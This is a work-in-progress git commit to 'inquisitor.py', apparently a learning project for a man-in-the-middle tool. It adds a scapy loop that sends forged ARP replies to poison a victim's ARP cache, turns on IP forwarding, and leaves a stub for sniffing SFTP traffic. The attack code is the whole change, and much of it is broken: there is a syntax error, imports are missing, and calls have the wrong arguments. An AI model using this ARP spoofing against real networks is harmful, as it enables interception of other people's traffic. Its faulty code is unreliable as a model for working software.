13f19424f80ba034e6ff491c5dd4ca53661bbd4e
elo <elodie.hamm@gmail.com>
2025-10-10 17:49:27 +0200

    manque sftp snif et envoi de packet WIP

--- inquisitor/inquisitor.py
+++ inquisitor/inquisitor.py
@@ -2,6 +2,7 @@ import argparse
 import re
 import logging
 import sys
+from scapy.all import ARP, send
 
 
 def validate_ipv4(ip):
@@ -31,23 +32,67 @@ def parse_args():
         parser.error("Invalid IP address format")
     if not validate_mac(args.src_mac) or not validate_mac(args.target_mac):
         parser.error("Invalid MAC format")
-    logging.info("Source (spoofed) IP: {args.src_ip} MAC: {args.src_mac}")
-    logging.info("Victim IP: {args.target_ip} MAC: {args.target_mac}")
+    logging.info(f"Source (spoofed) IP: {args.src_ip} MAC: {args.src_mac}")
+    logging.info(f"Victim IP: {args.target_ip} MAC: {args.target_mac}")
     return args
+
+class Inquisitor:
+    def __init__(self,src_ip, src_mac, target_ip, target_mac, verbose=False):
+        self.src_ip = src_ip
+        self.src_mac = src_mac
+        self.target_ip = target_ip
+        self.target_mac = target_mac
+        self.verbose = verbose
+        self.running = True
+
+# Ip forwarding or Routing - 0 = off 1 = on or i can also use this command when i create my container ? sysctl -w net.ipv4.ip_forward=1
+# can run  sysctl -p to check
+    def ip_forwarding(self):
+        try:
+            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
+                f.write('1')
+            logging.info("[+] IP forwarding enabled")
+        except Exception as e:
+            logging.warning(f"[!] Could not enable IP forwarding: {e}")
+
+    def arp_poison(self, target_ip, target_mac);
+        while self.running:
+            packet = ARP(
+                op=2,
+                hwsrc=self.src_mac,
+                psrc=self.src_ip,
+                hwdst=target_mac,
+                pdst=target_ip,
+                inter=RandNum(10,40),
+            )
+            send(packet, verbose = False)
+            time.sleep(2)
+
+# faire un threading ici
+    def start_poisoning(self):
+        self.arp_poison(self.target_ip, self.target_mac, self.src_ip)
+        self.arp_poison(self.src_ip,)
+
+    
+#Sniffer le SFTP ici
+
+
+
+
 
 
 def main():
-    if len(sys.argv) < 5:
-        logging.info("You need at least 4 parameters, ./inquisitor.py -h for more information")
-        sys.exit(1)
+        
+    logging.basicConfig(
+        level=logging.INFO,
+        format='[%(levelname)s] %(message)s')
     try:
         args = parse_args()
-
     
     except KeyboardInterrupt:
         logging.info("Interrupted by user CTRL+C")
         sys.exit(0)
-        
+
     except Exception as e:
         logging.error("Error {e}")
         sys.exit(1)
